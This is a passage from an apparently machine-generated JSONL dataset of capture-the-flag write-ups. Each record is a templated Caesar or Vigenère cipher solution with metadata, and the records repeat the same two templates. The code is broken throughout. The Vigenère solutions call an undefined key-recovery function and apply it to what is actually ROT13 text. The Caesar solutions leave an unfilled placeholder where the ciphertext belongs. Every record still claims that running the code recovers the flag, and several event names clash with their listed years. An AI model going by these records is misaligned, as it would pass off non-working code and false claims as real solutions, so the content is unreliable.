key)\nprint(flag)\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n", "url": "https://synthetic-ctf.example.com/classical/53", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.832646", "synthetic": true}
{"id": "synthetic_classical_054", "team": "synthetic_team_2", "event": "CTF_2024_Event_6", "challenge_name": "Vigenère Cipher #55", "challenge_description": "Polyalphabetic substitution cipher with repeating key", "attack_type": "Classical", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Vigenère Cipher\n\n## Challenge Description\nPolyalphabetic substitution cipher with repeating key\n\n## Analysis\nThis challenge involves vigenère cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n", "url": "https://synthetic-ctf.example.com/classical/54", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.832668", "synthetic": true}
{"id": "synthetic_classical_055", "team": "synthetic_team_6", "event": "CTF_2024_Event_5", "challenge_name": "Caesar Cipher #56", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/55", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.832684", "synthetic": true}
{"id": "synthetic_classical_056", "team": "synthetic_team_3", "event": "CTF_2024_Event_4", "challenge_name": "Vigenère Cipher #57", "challenge_description": "Polyalphabetic substitution cipher with repeating key", "attack_type": "Classical", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Vigenère Cipher\n\n## Challenge Description\nPolyalphabetic substitution cipher with repeating key\n\n## Analysis\nThis challenge involves vigenère cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n", "url": "https://synthetic-ctf.example.com/classical/56", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.832707", "synthetic": true}
{"id": "synthetic_classical_057", "team": "synthetic_team_5", "event": "CTF_2024_Event_18", "challenge_name": "Vigenère Cipher #58", "challenge_description": "Polyalphabetic substitution cipher with repeating key", "attack_type": "Classical", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Vigenère Cipher\n\n## Challenge Description\nPolyalphabetic substitution cipher with repeating key\n\n## Analysis\nThis challenge involves vigenère cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n", "url": "https://synthetic-ctf.example.com/classical/57", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.832726", "synthetic": true}
{"id": "synthetic_classical_058", "team": "synthetic_team_8", "event": "CTF_2024_Event_18", "challenge_name": "Caesar Cipher #59", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/58", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.832741", "synthetic": true}
{"id": "synthetic_classical_059", "team": "synthetic_team_4", "event": "CTF_2024_Event_19", "challenge_name": "Caesar Cipher #60", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/59", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.832753", "synthetic": true}
{"id": "synthetic_classical_060", "team": "synthetic_team_8", "event": "CTF_2024_Event_11", "challenge_name": "Caesar Cipher #61", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/60", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.832769", "synthetic": true}
{"id": "synthetic_classical_061", "team": "synthetic_team_9", "event": "CTF_2024_Event_10", "challenge_name": "Vigenère Cipher #62", "challenge_description": "Polyalphabetic substitution cipher with repeating key", "attack_type": "Classical", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Vigenère Cipher\n\n## Challenge Description\nPolyalphabetic substitution cipher with repeating key\n\n## Analysis\nThis challenge involves vigenère cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n", "url": "https://synthetic-ctf.example.com/classical/61", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.832786", "synthetic": true}
{"id": "synthetic_classical_062", "team": "synthetic_team_3", "event": "CTF_2024_Event_17", "challenge_name": "Caesar Cipher #63", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/62", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.832797", "synthetic": true}
{"id": "synthetic_classical_063", "team": "synthetic_team_9", "event": "CTF_2024_Event_5", "challenge_name": "Caesar Cipher #64", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/63", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.832808", "synthetic": true}
{"id": "synthetic_classical_064", "team": "synthetic_team_6", "event": "CTF_2024_Event_8", "challenge_name": "Caesar Cipher #65", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/64", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.832818", "synthetic": true}
{"id": "synthetic_classical_065", "team": "synthetic_team_5", "event": "CTF_2024_Event_5", "challenge_name": "Vigenère Cipher #66", "challenge_description": "Polyalphabetic substitution cipher with repeating key", "attack_type": "Classical", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Vigenère Cipher\n\n## Challenge Description\nPolyalphabetic substitution cipher with repeating key\n\n## Analysis\nThis challenge involves vigenère cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n", "url": "https://synthetic-ctf.example.com/classical/65", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.832835", "synthetic": true}
{"id": "synthetic_classical_066", "team": "synthetic_team_2", "event": "CTF_2024_Event_19", "challenge_name": "Vigenère Cipher #67", "challenge_description": "Polyalphabetic substitution cipher with repeating key", "attack_type": "Classical", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Vigenère Cipher\n\n## Challenge Description\nPolyalphabetic substitution cipher with repeating key\n\n## Analysis\nThis challenge involves vigenère cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n", "url": "https://synthetic-ctf.example.com/classical/66", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.832851", "synthetic": true}
{"id": "synthetic_classical_067", "team": "synthetic_team_2", "event": "CTF_2024_Event_3", "challenge_name": "Caesar Cipher #68", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/67", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.832861", "synthetic": true}
{"id": "synthetic_classical_068", "team": "synthetic_team_3", "event": "CTF_2024_Event_7", "challenge_name": "Vigenère Cipher #69", "challenge_description": "Polyalphabetic substitution cipher with repeating key", "attack_type": "Classical", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Vigenère Cipher\n\n## Challenge Description\nPolyalphabetic substitution cipher with repeating key\n\n## Analysis\nThis challenge involves vigenère cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n", "url": "https://synthetic-ctf.example.com/classical/68", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.832879", "synthetic": true}
{"id": "synthetic_classical_069", "team": "synthetic_team_1", "event": "CTF_2024_Event_12", "challenge_name": "Caesar Cipher #70", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/69", "year": 2024, "category": "crypto", 